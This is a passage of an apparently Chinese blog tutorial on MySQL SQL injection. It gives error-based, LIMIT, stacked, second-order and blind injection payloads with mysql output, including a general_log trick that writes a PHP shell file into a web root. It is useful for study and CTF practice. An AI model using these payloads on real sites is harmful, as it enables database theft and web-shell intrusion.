extractvalue(1,concat(0x7e,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and updatexml(1,concat(0x7e,user(),0x7e),1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span>  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and (select 1 from(select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure><h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul><li><p>常用函数</p><ul><li>limit [位置偏移量,]行数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math limit 1,2;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math limit 1,3;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>benchmark</p><p>benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 .</p></li></ul></li><li><p>limit注入</p><ul><li><p>注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math limit 1,[可控点] </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math order by id desc limit 1,2</span><br></pre></td></tr></table></figure><p>limit后面能够拼接的函数只有into和procedure。</p></li><li><p>无order by关键字</p><ul><li><p>使用union联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from math order by id desc limit 0,1 union select username from users;</span><br></pre></td></tr></table></figure></li><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li><li><p>有order by关键字</p><p>无法使用union关键字，可尝试盲注或者报错</p><ul><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li></ul></li></ul><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>定义</p><p>堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  * from  math;select user();</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>原理：</p><ul><li><p>mysql_query与mysqli-&gt;multi_query()</p><p>mysql_query() 函数执行一条 MySQL 查询。</p><p>mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。</p></li><li><p>利用配合日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure></li></ul><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><ul><li><p>原理：</p><p>用户第一次输入的数据，经过各种函数处理比如<code>addslashes</code>或者<code>get_magic_quotes_gpc</code>之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。</p></li><li><p>实例：</p><p>sqlib-24</p><p>我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。</p><p>程序从数据库中取出脏数据后，执行的sql语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><p>原理：</p><p>指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。</p><p>盲注分为两类：<br> 　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br> 　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p></li><li><p>常用函数</p><h5 id="IF"><a href="#IF" class="headerlink" title="IF()"></a>IF()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><h5 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h5><p>MID() 函数用于从文本字段中提取字符。</p><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| No                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Now                  |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,0,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><strong>substr()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| N                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,2,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| o                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,3,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| w                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| No                      |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>case()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| two                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| one                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| more                                                       |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII">ASCII</a> 值。</p><h5 id="ELT-N-str1-str2-str3-…"><a href="#ELT-N-str1-str2-str3-…" class="headerlink" title="ELT(N,str1,str2,str3,…)"></a>ELT(N,str1,str2,str3,…)</h5><p>如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;)                      |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ej                                                      |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>sleep()、BENCHMARK()</p></li><li><p>笛卡尔积</p><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</span><br></pre></td></tr></table></figure><p>具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。</p><p>实例：</p><p>配合if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null))</span><br></pre></td></tr></table></figure></li><li><p>Get_lock() 加锁机制</p><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p>原理：</p><p>尝试对一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">  +-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">  +-------------------------+</span><br><span class="line">  |                       1 |</span><br><span class="line">  +-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>尝试开启另一个客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.01 sec)</span><br></pre></td></tr></table></figure><p>实例：</p><p>对有一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1);</span><br></pre></td></tr></table></figure><p>再次加锁(配合if)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null);</span><br></pre></td></tr></table></figure><p>限制条件：</p><p>限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close()  关闭与数据库的连接，也就是 web  服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>其他盲注函数–mysql中用regexp是区分大小写的</p><ul><li><p>lpad和rpad函数</p><p>lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(1,5,2);</span><br><span class="line">+-------------+</span><br><span class="line">| lpad(1,5,2) |</span><br><span class="line">+-------------+</span><br><span class="line">| 22221       |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul><p>配合盲注</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(lpad(1,(select length(database())),2));</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| length(lpad(1,(select length(database())),2)) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             4 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select lpad(1,(select length(database())),2);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| lpad(1,(select length(database())),2) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| 2221                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>like和regexp:</p><p>Like:</p><p>% : 匹配0个或任意多个字符</p><p>_ : 匹配任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否是t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t%&#39;;</span><br><span class="line">+----------------------+</span><br><span class="line">| database() like &#39;t%&#39; |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>判断前两个字符是不是te</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;te%&#39;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| database() like &#39;te%&#39; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断是否包含es两个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;%es%&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;%es%&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断有几个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;_____&#39;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| database() like &#39;_____&#39; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database() like &#39;____&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;____&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t___&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;t___&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>like配合盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">+------+-----------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意点就是如果匹配成功就会返回1否则就是0。</p><p>REGEXP:</p><p>盲注值正则表达式攻击(^、&amp;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 